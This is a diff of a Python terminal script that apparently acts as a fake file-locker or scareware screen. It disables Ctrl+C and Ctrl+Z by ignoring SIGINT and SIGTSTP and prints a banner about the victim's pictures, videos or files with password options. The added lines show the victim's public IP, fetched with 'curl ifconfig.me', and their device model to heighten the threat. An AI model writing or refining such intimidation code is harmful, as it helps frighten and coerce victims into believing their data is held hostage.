@@ -1,6 +1,5 @@
-print (""" """)
-
-import os ,sys ,signal      
+import os ,sys ,signal,subprocess,readline
+      
 signal.signal(signal.SIGTSTP, signal.SIG_IGN)
 signal.signal(signal.SIGINT, signal.SIG_IGN)
  
@@ -11,7 +10,10 @@ blue="\033[1;34m"
 prple="\033[1;35m"
 cyan="\033[1;36m"
 res="\033[0m"
-      
+
+IP=subprocess.run("curl ifconfig.me", capture_output=True,shell=True).stdout.decode('ascii')
+dev=subprocess.run("neofetch |grep Host|cut -d ':' -f 2-10 ", capture_output=True,shell=True).stdout.decode('ascii')
+
 def logo():
   print(f"""
   {grn}      Your Picture ,Videos or files 
@@ -25,7 +27,11 @@ def logo():
 {yel}	|{red}  a   {prple}Request for Password {yel} |
 {yel}	|{red}  b   {prple}Type Password       {yel}  |
 {yel}        |____________________________|
+
+  {cyan}Your IP Adress :{grn} {IP}
+  {cyan}Device         :{grn}{dev}
   {res}
+  
   """)
   
 os.system("clear")
